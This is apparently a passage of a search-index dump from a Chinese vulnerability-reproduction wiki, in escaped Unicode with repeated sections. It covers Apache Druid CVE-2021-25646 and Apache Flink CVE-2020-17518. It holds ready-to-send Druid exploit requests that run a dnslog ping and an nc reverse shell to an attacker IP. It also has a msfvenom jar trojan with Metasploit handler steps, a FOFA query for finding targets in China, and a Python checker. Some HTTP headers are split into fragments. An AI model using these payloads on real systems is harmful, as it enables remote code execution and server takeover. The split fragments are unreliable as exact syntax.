\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u7f3a\u4e4f\u6388\u6743\u8ba4\u8bc1\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u53d1\u9001\u7279\u5236\u8bf7\u6c42\uff0c\u5229\u7528Druid\u670d\u52a1\u5668\u4e0a\u8fdb\u7a0b\u7684\u7279\u6743\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002 Apache Druid\u5305\u62ec\u6267\u884c\u7528\u6237\u63d0\u4f9b\u7684JavaScript\u7684\u529f\u80fd\u5d4c\u5165\u5728\u5404\u79cd\u7c7b\u578b\u8bf7\u6c42\u4e2d\u7684\u4ee3\u7801\u3002\u6b64\u529f\u80fd\u5728\u7528\u4e8e\u9ad8\u4fe1\u4efb\u5ea6\u73af\u5883\u4e2d\uff0c\u9ed8\u8ba4\u5df2\u88ab\u7981\u7528\u3002\u4f46\u662f\uff0c\u5728Druid 0.20.0\u53ca\u66f4\u4f4e\u7248\u672c\u4e2d\uff0c\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684\u7528\u6237\u53d1\u9001\u6076\u610f\u8bf7\u6c42\uff0c\u5229\u7528Apache Druid\u6f0f\u6d1e\u53ef\u4ee5\u6267\u884c\u4efb\u610f\u4ee3\u7801 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] Apache Druid < 0.20.1 \u73af\u5883\u642d\u5efa \u00b6 \u8fd9\u91cc\u4f7f\u7528Docker\u6765\u642d\u5efa\u73af\u5883 Docker\u4e0b\u8f7d\u94fe\u63a5: https://github.com/apache/druid/archive/druid-0.20.0.zip \u4e0b\u8f7d\u4e4b\u540e\u8fdb\u5165\u76ee\u5f55 distribution\\docker \u6267\u884c\u547d\u4ee4\u7f16\u8bd1 docker-compose up -d \u8bbf\u95ee http://xxx.xxx.xxx.xxx:8888 \u6b63\u5e38\u5c31\u884c\u4e86 \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u6f0f\u6d1e\u539f\u7406: https://mp.weixin.qq.com/s/McAoLfyf_tgFIfGTAoRCiw POC\u8bf7\u6c42\u5305 POST /druid/i n dexer/v 1 /sampler HTTP/ 1.1 Hos t : xxx.xxx.xxx.xxx\u200b : 8888 User - Age nt : Mozilla/ 5.0 (Maci nt osh; I ntel Mac OS X 10.16 ; rv : 85.0 ) Gecko/ 20100101 Fire f ox/ 85.0 Accep t : applica t io n /jso n , te x t /plai n , */* Accep t - La n guage : zh - CN , zh;q= 0.8 , zh - TW;q= 0.7 , zh - HK;q= 0.5 , e n - US;q= 0.3 , e n ;q= 0.2 Co ntent - Type : applica t io n /jso n Co ntent - Le n g t h : 995 Co nne c t io n : close { \"type\" : \"index\" , \"spec\" : { \"ioConfig\" : { \"type\" : \"index\" , \"inputSource\" : { \"type\" : \"inline\" , \"data\" : \"{\\\"isRobot\\\":true,\\\"channel\\\":\\\"#x\\\",\\\"timestamp\\\":\\\"2021-2-1T14:12:24.050Z\\\",\\\"flags\\\":\\\"x\\\",\\\"isUnpatrolled\\\":false,\\\"page\\\":\\\"1\\\",\\\"diffUrl\\\":\\\"https://xxx.com\\\",\\\"added\\\":1,\\\"comment\\\":\\\"Botskapande Indonesien omdirigering\\\",\\\"commentLength\\\":35,\\\"isNew\\\":true,\\\"isMinor\\\":false,\\\"delta\\\":31,\\\"isAnonymous\\\":true,\\\"user\\\":\\\"Lsjbot\\\",\\\"deltaBucket\\\":0,\\\"deleted\\\":0,\\\"namespace\\\":\\\"Main\\\"}\" }, \"inputFormat\" : { \"type\" : \"json\" , \"keepNullColumns\" : true }}, \"dataSchema\" : { \"dataSource\" : \"sample\" , \"timestampSpec\" : { \"column\" : \"timestamp\" , \"format\" : \"iso\" }, \"dimensionsSpec\" : {}, \"transformSpec\" : { \"transforms\" : [], \"filter\" : { \"type\" : \"javascript\" , \"dimension\" : \"added\" , \"function\" : \"function(value) {java.lang.Runtime.getRuntime().exec('ping xxxxx.dnslog.cn')}\" , \"\" : { \"enabled\" : true }}}}, \"type\" : \"index\" , \"tuningConfig\" : { \"type\" : \"index\" }}, \"samplerConfig\" : { \"numRows\" : 500 , \"timeoutMs\" : 15000 }} [!NOTE] \u6ce8\u610f\u8bf7\u6c42\u4e2d\u8fd9\u4e2a\u4f4d\u7f6e\u6539\u4e3a\u4f60\u7684dnslog\u5e73\u53f0\u5730\u5740 java.lang.Runtime.getRuntime().exec('ping -c 4 xxxxx.dnslog.cn') \u53d1\u9001\u8bf7\u6c42\u5373\u53ef\u547d\u4ee4\u6267\u884c [!NOTE] \u770b\u4e86\u4e0b\u53ef\u80fd\u5927\u90e8\u5206\u90fd\u662fdocker\u642d\u5efa\uff0c\u800c\u91cc\u9762\u5927\u90e8\u5206\u547d\u4ee4\u662f\u4e0d\u5b58\u5728\u7684\uff0c\u4f46\u662f\u53d1\u73b0docker\u91cc\u9762\u5c45\u7136\u9ed8\u8ba4\u662f\u6709 NC \u547d\u4ee4\u7684\uff0c\u90a3\u6211\u4eec\u5c31\u53ef\u4ee5\u7528nc\u53cd\u5f39\u4e00\u4e2ashell\u4e86 \u53cd\u5f39shell\u8bf7\u6c42\u5305 POST /druid/i n dexer/v 1 /sampler HTTP/ 1.1 Hos t : xxx.xxx.xxx.xxx\u200b : 8888 User - Age nt : Mozilla/ 5.0 (Maci nt osh; I ntel Mac OS X 10.16 ; rv : 85.0 ) Gecko/ 20100101 Fire f ox/ 85.0 Accep t : applica t io n /jso n , te x t /plai n , */* Accep t - La n guage : zh - CN , zh;q= 0.8 , zh - TW;q= 0.7 , zh - HK;q= 0.5 , e n - US;q= 0.3 , e n ;q= 0.2 Co ntent - Type : applica t io n /jso n Co ntent - Le n g t h : 1008 Co nne c t io n : close { \"type\" : \"index\" , \"spec\" : { \"ioConfig\" : { \"type\" : \"index\" , \"inputSource\" : { \"type\" : \"inline\" , \"data\" : \"{\\\"isRobot\\\":true,\\\"channel\\\":\\\"#x\\\",\\\"timestamp\\\":\\\"2021-2-1T14:12:24.050Z\\\",\\\"flags\\\":\\\"x\\\",\\\"isUnpatrolled\\\":false,\\\"page\\\":\\\"1\\\",\\\"diffUrl\\\":\\\"https://xxx.com\\\",\\\"added\\\":1,\\\"comment\\\":\\\"Botskapande Indonesien omdirigering\\\",\\\"commentLength\\\":35,\\\"isNew\\\":true,\\\"isMinor\\\":false,\\\"delta\\\":31,\\\"isAnonymous\\\":true,\\\"user\\\":\\\"Lsjbot\\\",\\\"deltaBucket\\\":0,\\\"deleted\\\":0,\\\"namespace\\\":\\\"Main\\\"}\" }, \"inputFormat\" : { \"type\" : \"json\" , \"keepNullColumns\" : true }}, \"dataSchema\" : { \"dataSource\" : \"sample\" , \"timestampSpec\" : { \"column\" : \"timestamp\" , \"format\" : \"iso\" }, \"dimensionsSpec\" : {}, \"transformSpec\" : { \"transforms\" : [], \"filter\" : { \"type\" : \"javascript\" , \"dimension\" : \"added\" , \"function\" : \"function(value) {java.lang.Runtime.getRuntime().exec(' nc xxx.xxx.xxx.xxx 9999 -e /bin/sh')}\" , \"\" : { \"enabled\" : true }}}}, \"type\" : \"index\" , \"tuningConfig\" : { \"type\" : \"index\" }}, \"samplerConfig\" : { \"numRows\" : 500 , \"timeoutMs\" : 15000 }} \u53d1\u9001\u8bf7\u6c42\u5305\u5c31\u53ef\u4ee5\u5f97\u5230\u4e00\u4e2a\u4ea4\u4e92\u5f0fshell\u4e86","title":"Apache Druid \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e CVE-2021-25646"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Druid/Apache%20Druid%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-25646/#apache-druid-\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e-cve-2021-25646","text":"","title":"Apache Druid \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e CVE-2021-25646"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Druid/Apache%20Druid%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-25646/#\u6f0f\u6d1e\u63cf\u8ff0","text":"Apache Druid \u662f\u7528Java\u7f16\u5199\u7684\u9762\u5411\u5217\u7684\u5f00\u6e90\u5206\u5e03\u5f0f\u6570\u636e\u5b58\u50a8\uff0c\u65e8\u5728\u5feb\u901f\u83b7\u53d6\u5927\u91cf\u4e8b\u4ef6\u6570\u636e\uff0c\u5e76\u5728\u6570\u636e\u4e4b\u4e0a\u63d0\u4f9b\u4f4e\u5ef6\u8fdf\u67e5\u8be2\u3002 Apache Druid \u9ed8\u8ba4\u60c5\u51b5\u4e0b\u7f3a\u4e4f\u6388\u6743\u8ba4\u8bc1\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u53d1\u9001\u7279\u5236\u8bf7\u6c42\uff0c\u5229\u7528Druid\u670d\u52a1\u5668\u4e0a\u8fdb\u7a0b\u7684\u7279\u6743\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002 Apache Druid\u5305\u62ec\u6267\u884c\u7528\u6237\u63d0\u4f9b\u7684JavaScript\u7684\u529f\u80fd\u5d4c\u5165\u5728\u5404\u79cd\u7c7b\u578b\u8bf7\u6c42\u4e2d\u7684\u4ee3\u7801\u3002\u6b64\u529f\u80fd\u5728\u7528\u4e8e\u9ad8\u4fe1\u4efb\u5ea6\u73af\u5883\u4e2d\uff0c\u9ed8\u8ba4\u5df2\u88ab\u7981\u7528\u3002\u4f46\u662f\uff0c\u5728Druid 0.20.0\u53ca\u66f4\u4f4e\u7248\u672c\u4e2d\uff0c\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684\u7528\u6237\u53d1\u9001\u6076\u610f\u8bf7\u6c42\uff0c\u5229\u7528Apache Druid\u6f0f\u6d1e\u53ef\u4ee5\u6267\u884c\u4efb\u610f\u4ee3\u7801","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Druid/Apache%20Druid%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-25646/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] Apache Druid < 0.20.1","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Druid/Apache%20Druid%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-25646/#\u73af\u5883\u642d\u5efa","text":"\u8fd9\u91cc\u4f7f\u7528Docker\u6765\u642d\u5efa\u73af\u5883 Docker\u4e0b\u8f7d\u94fe\u63a5: https://github.com/apache/druid/archive/druid-0.20.0.zip \u4e0b\u8f7d\u4e4b\u540e\u8fdb\u5165\u76ee\u5f55 distribution\\docker \u6267\u884c\u547d\u4ee4\u7f16\u8bd1 docker-compose up -d \u8bbf\u95ee http://xxx.xxx.xxx.xxx:8888 \u6b63\u5e38\u5c31\u884c\u4e86","title":"\u73af\u5883\u642d\u5efa"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Druid/Apache%20Druid%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-25646/#\u6f0f\u6d1e\u590d\u73b0","text":"\u6f0f\u6d1e\u539f\u7406: https://mp.weixin.qq.com/s/McAoLfyf_tgFIfGTAoRCiw POC\u8bf7\u6c42\u5305 POST /druid/i n dexer/v 1 /sampler HTTP/ 1.1 Hos t : xxx.xxx.xxx.xxx\u200b : 8888 User - Age nt : Mozilla/ 5.0 (Maci nt osh; I ntel Mac OS X 10.16 ; rv : 85.0 ) Gecko/ 20100101 Fire f ox/ 85.0 Accep t : applica t io n /jso n , te x t /plai n , */* Accep t - La n guage : zh - CN , zh;q= 0.8 , zh - TW;q= 0.7 , zh - HK;q= 0.5 , e n - US;q= 0.3 , e n ;q= 0.2 Co ntent - Type : applica t io n /jso n Co ntent - Le n g t h : 995 Co nne c t io n : close { \"type\" : \"index\" , \"spec\" : { \"ioConfig\" : { \"type\" : \"index\" , \"inputSource\" : { \"type\" : \"inline\" , \"data\" : \"{\\\"isRobot\\\":true,\\\"channel\\\":\\\"#x\\\",\\\"timestamp\\\":\\\"2021-2-1T14:12:24.050Z\\\",\\\"flags\\\":\\\"x\\\",\\\"isUnpatrolled\\\":false,\\\"page\\\":\\\"1\\\",\\\"diffUrl\\\":\\\"https://xxx.com\\\",\\\"added\\\":1,\\\"comment\\\":\\\"Botskapande Indonesien omdirigering\\\",\\\"commentLength\\\":35,\\\"isNew\\\":true,\\\"isMinor\\\":false,\\\"delta\\\":31,\\\"isAnonymous\\\":true,\\\"user\\\":\\\"Lsjbot\\\",\\\"deltaBucket\\\":0,\\\"deleted\\\":0,\\\"namespace\\\":\\\"Main\\\"}\" }, \"inputFormat\" : { \"type\" : \"json\" , \"keepNullColumns\" : true }}, \"dataSchema\" : { \"dataSource\" : \"sample\" , \"timestampSpec\" : { \"column\" : \"timestamp\" , \"format\" : \"iso\" }, \"dimensionsSpec\" : {}, \"transformSpec\" : { \"transforms\" : [], \"filter\" : { \"type\" : \"javascript\" , \"dimension\" : \"added\" , \"function\" : \"function(value) {java.lang.Runtime.getRuntime().exec('ping xxxxx.dnslog.cn')}\" , \"\" : { \"enabled\" : true }}}}, \"type\" : \"index\" , \"tuningConfig\" : { \"type\" : \"index\" }}, \"samplerConfig\" : { \"numRows\" : 500 , \"timeoutMs\" : 15000 }} [!NOTE] \u6ce8\u610f\u8bf7\u6c42\u4e2d\u8fd9\u4e2a\u4f4d\u7f6e\u6539\u4e3a\u4f60\u7684dnslog\u5e73\u53f0\u5730\u5740 java.lang.Runtime.getRuntime().exec('ping -c 4 xxxxx.dnslog.cn') \u53d1\u9001\u8bf7\u6c42\u5373\u53ef\u547d\u4ee4\u6267\u884c [!NOTE] \u770b\u4e86\u4e0b\u53ef\u80fd\u5927\u90e8\u5206\u90fd\u662fdocker\u642d\u5efa\uff0c\u800c\u91cc\u9762\u5927\u90e8\u5206\u547d\u4ee4\u662f\u4e0d\u5b58\u5728\u7684\uff0c\u4f46\u662f\u53d1\u73b0docker\u91cc\u9762\u5c45\u7136\u9ed8\u8ba4\u662f\u6709 NC \u547d\u4ee4\u7684\uff0c\u90a3\u6211\u4eec\u5c31\u53ef\u4ee5\u7528nc\u53cd\u5f39\u4e00\u4e2ashell\u4e86 \u53cd\u5f39shell\u8bf7\u6c42\u5305 POST /druid/i n dexer/v 1 /sampler HTTP/ 1.1 Hos t : xxx.xxx.xxx.xxx\u200b : 8888 User - Age nt : Mozilla/ 5.0 (Maci nt osh; I ntel Mac OS X 10.16 ; rv : 85.0 ) Gecko/ 20100101 Fire f ox/ 85.0 Accep t : applica t io n /jso n , te x t /plai n , */* Accep t - La n guage : zh - CN , zh;q= 0.8 , zh - TW;q= 0.7 , zh - HK;q= 0.5 , e n - US;q= 0.3 , e n ;q= 0.2 Co ntent - Type : applica t io n /jso n Co ntent - Le n g t h : 1008 Co nne c t io n : close { \"type\" : \"index\" , \"spec\" : { \"ioConfig\" : { \"type\" : \"index\" , \"inputSource\" : { \"type\" : \"inline\" , \"data\" : \"{\\\"isRobot\\\":true,\\\"channel\\\":\\\"#x\\\",\\\"timestamp\\\":\\\"2021-2-1T14:12:24.050Z\\\",\\\"flags\\\":\\\"x\\\",\\\"isUnpatrolled\\\":false,\\\"page\\\":\\\"1\\\",\\\"diffUrl\\\":\\\"https://xxx.com\\\",\\\"added\\\":1,\\\"comment\\\":\\\"Botskapande Indonesien omdirigering\\\",\\\"commentLength\\\":35,\\\"isNew\\\":true,\\\"isMinor\\\":false,\\\"delta\\\":31,\\\"isAnonymous\\\":true,\\\"user\\\":\\\"Lsjbot\\\",\\\"deltaBucket\\\":0,\\\"deleted\\\":0,\\\"namespace\\\":\\\"Main\\\"}\" }, \"inputFormat\" : { \"type\" : \"json\" , \"keepNullColumns\" : true }}, \"dataSchema\" : { \"dataSource\" : \"sample\" , \"timestampSpec\" : { \"column\" : \"timestamp\" , \"format\" : \"iso\" }, \"dimensionsSpec\" : {}, \"transformSpec\" : { \"transforms\" : [], \"filter\" : { \"type\" : \"javascript\" , \"dimension\" : \"added\" , \"function\" : \"function(value) {java.lang.Runtime.getRuntime().exec(' nc xxx.xxx.xxx.xxx 9999 -e /bin/sh')}\" , \"\" : { \"enabled\" : true }}}}, \"type\" : \"index\" , \"tuningConfig\" : { \"type\" : \"index\" }}, \"samplerConfig\" : { \"numRows\" : 500 , \"timeoutMs\" : 15000 }} \u53d1\u9001\u8bf7\u6c42\u5305\u5c31\u53ef\u4ee5\u5f97\u5230\u4e00\u4e2a\u4ea4\u4e92\u5f0fshell\u4e86","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Flink/Apache%20Flink%20%E5%B0%8F%E4%BA%8E1.9.1%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%20CVE-2020-17518/","text":"Apache Flink <= 1.9.1(\u6700\u65b0\u7248\u672c) \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c CVE-2020-17518 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u8fd1\u65e5,\u6709\u5b89\u5168\u7814\u7a76\u5458\u516c\u5f00\u4e86\u4e00\u4e2aApache Flink\u7684\u4efb\u610fJar\u5305\u4e0a\u4f20\u5bfc\u81f4\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u7684\u6f0f\u6d1e. \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] Apache Flink <= 1.9.1(\u6700\u65b0\u7248\u672c) FOFA \u00b6 FOFA \u8bed\u53e5 app=\"Apache-Flink\" && country=\"CN\" \u56fd\u5185\u8fd8\u662f\u5f88\u591a\u4f7f\u7528 Apache Flink \u7684\uff0c\u5927\u6982\u67091000\u7684\u6570\u91cf\u5de6\u53f3 \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u6253\u5f00\u4e00\u4e2a\u4f7f\u7528 Apache Flink \u7684\u7f51\u7ad9\uff0c\u6253\u5f00\u540e\u9875\u9762\u4e3a\u8fd9\u6837\u5b50 \u70b9\u51fb\u67e5\u770b\u6587\u4ef6\u4e0a\u4f20\u9875\u9762 \u6253\u5f00MSF \u751f\u6210\u4e00\u4e2a jar \u6728\u9a6c msfvenom -p java/meterpreter/reverse_tcp LHOST = xxx.xxx.xxx.xxx LPORT = 4444 -f jar > test.jar \u70b9\u51fb Add \u4e0a\u4f20 jar \u6587\u4ef6 \u76d1\u542c\u7aef\u53e3 msf6 > use exploit/multi/handler [ * ] Using configured payload generic/shell_reverse_tcp msf6 exploit ( multi/handler ) > set payload java/shell/reverse_tcp payload = > java/shell/reverse_tcp msf6 exploit ( multi/handler ) > set lhost xxx.xxx.xxx.xxx lhost = > xxx.xxx.xxx.xxx msf6 exploit ( multi/handler ) > set lport 4444 lport = > 4444 msf6 exploit ( multi/handler ) > run \u70b9\u51fb\u4e0b submit \u53cd\u5f39\u56de\u6765\u4e00\u4e2aroot \u6743\u9650shell \u6f0f\u6d1e\u68c0\u6d4bPOC \u00b6 import requests def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: Apache Flink <= 1.9.1 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 Apache_Flink.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx:9999 \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/jars/upload\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } try : response = requests . get ( url = vuln_url , headers = headers , timeout = 20 ) if \"Unable to load requested file /jars/upload.\" in response . text : print ( \" \\033 [32m[o] \u53ef\u80fd\u5b58\u5728 Apache Flink <= 1.9.1 \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e \\n\\033 [0m\" ) else : print ( \" \\033 [31m[x] \u76ee\u6807Url \u6587\u4ef6\u4e0a\u4f20\u6a21\u5757\u65e0\u6cd5\u4f7f\u7528 \\033 [0m\" ) except : print ( \" \\033 [31m[x] \u76ee\u6807Url\u6f0f\u6d1e\u5229\u7528\u5931\u8d25 \\033 [0m\" ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url )","title":"Apache Flink \u5c0f\u4e8e1.9.1\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c CVE-2020-17518"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Flink/Apache%20Flink%20%E5%B0%8F%E4%BA%8E1.9.1%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%20CVE-2020-17518/#apache-flink--191\u6700\u65b0\u7248\u672c-\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c-cve-2020-17518","text":"","title":"Apache Flink &lt;= 1.9.1(\u6700\u65b0\u7248\u672c) \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c CVE-2020-17518"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Flink/Apache%20Flink%20%E5%B0%8F%E4%BA%8E1.9.1%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%20CVE-2020-17518/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u8fd1\u65e5,\u6709\u5b89\u5168\u7814\u7a76\u5458\u516c\u5f00\u4e86\u4e00\u4e2aApache Flink\u7684\u4efb\u610fJar\u5305\u4e0a\u4f20\u5bfc\u81f4\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u7684\u6f0f\u6d1e.","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Flink/Apache%20Flink%20%E5%B0%8F%E4%BA%8E1.9.1%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%20CVE-2020-17518/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] Apache Flink <= 1.9.1(\u6700\u65b0\u7248\u672c)","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Flink/Apache%20Flink%20%E5%B0%8F%E4%BA%8E1.9.1%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%20CVE-2020-17518/#fofa","text":"FOFA \u8bed\u53e5 app=\"Apache-Flink\" && country=\"CN\" \u56fd\u5185\u8fd8\u662f\u5f88\u591a\u4f7f\u7528 Apache Flink \u7684\uff0c\u5927\u6982\u67091000\u7684\u6570\u91cf\u5de6\u53f3","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Flink/Apache%20Flink%20%E5%B0%8F%E4%BA%8E1.9.1%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%20CVE-2020-17518/#\u6f0f\u6d1e\u590d\u73b0","text":"\u6253\u5f00\u4e00\u4e2a\u4f7f\u7528 Apache Flink \u7684\u7f51\u7ad9\uff0c\u6253\u5f00\u540e\u9875\u9762\u4e3a\u8fd9\u6837\u5b50 \u70b9\u51fb\u67e5\u770b\u6587\u4ef6\u4e0a\u4f20\u9875\u9762 \u6253\u5f00MSF \u751f\u6210\u4e00\u4e2a jar \u6728\u9a6c msfvenom -p java/meterpreter/reverse_tcp LHOST = xxx.xxx.xxx.xxx LPORT = 4444 -f jar > test.jar \u70b9\u51fb Add \u4e0a\u4f20 jar \u6587\u4ef6 \u76d1\u542c\u7aef\u53e3 msf6 > use exploit/multi/handler [ * ] Using configured payload generic/shell_reverse_tcp msf6 exploit ( multi/handler ) > set payload java/shell/reverse_tcp payload = > java/shell/reverse_tcp msf6 exploit ( multi/handler ) > set lhost xxx.xxx.xxx.xxx lhost = > xxx.xxx.xxx.xxx msf6 exploit ( multi/handler ) > set lport 4444 lport = > 4444 msf6 exploit ( multi/handler ) > run \u70b9\u51fb\u4e0b submit \u53cd\u5f39\u56de\u6765\u4e00\u4e2aroot \u6743\u9650shell","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Flink/Apache%20Flink%20%E5%B0%8F%E4%BA%8E1.9.1%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%20CVE-2020-17518/#\u6f0f\u6d1e\u68c0\u6d4bpoc","text":"import requests def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: Apache Flink <= 1.9.1 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 Apache_Flink.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx:9999 \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/jars/upload\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } try : response = requests . get ( url = vuln_url , headers = headers , timeout = 20 ) if \"Unable to load requested file /jars/upload.\" in response . text : print ( \" \\033 [32m[o] \u53ef\u80fd\u5b58\u5728 Apache Flink <= 1.9.1 \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e \\n\\033 [0m\" ) else : print ( \" \\033 [31m[x] \u76ee\u6807Url \u6587\u4ef6\u4e0a\u4f20\u6a21\u5757\u65e0\u6cd5\u4f7f\u7528 \\033 [0m\" ) except : print ( \" \\033 [31m[x] \u76ee\u6807Url\u6f0f\u6d1e\u5229\u7528\u5931\u8d25 \\033 [0m\" ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url )","title":"\u6f0f\u6d1e\u68c0\u6d4bPOC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Flink/Apache%20Flink%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%20CVE-2020-17519/","text":"Apache Flink \u76ee\u5f55\u904d\u5386\u6f0f\u6d1e CVE-2020-17519 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 2021\u5e7401\u670806\u65e5\uff0c360CERT\u76d1\u6d4b\u53d1\u73b0 Apache Flink \u53d1\u5e03\u4e86 Apache Flink \u76ee\u5f55\u7a7f\u8d8a\u6f0f\u6d1e,\u76ee\u5f55\u7a7f\u8d8a\u6f0f\u6d1e \u7684\u98ce\u9669\u901a\u544a\uff0c\u6f0f\u6d1e\u7f16\u53f7\u4e3a 